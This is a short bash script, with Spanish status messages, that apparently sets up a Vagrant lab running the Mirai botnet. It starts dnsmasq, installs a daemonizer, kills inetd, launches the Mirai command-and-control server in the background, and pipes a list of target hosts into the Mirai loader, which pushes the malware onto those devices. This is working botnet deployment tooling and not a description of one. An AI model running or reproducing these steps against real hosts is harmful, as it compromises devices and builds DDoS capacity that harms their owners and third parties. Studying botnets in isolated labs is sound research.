#!/usr/bin/env bash

echo "*** Comprobando & iniciando cnc... ***"
sudo dnsmasq
sudo apt-get install duende -y
killall inetd || true
killall cnc || true
duende /vagrant/mirai/release/cnc

echo "*** Iniciando loader... ***"
cd /vagrant/mirai/loader
cat /vagrant/configs/hosts.txt | ./loader
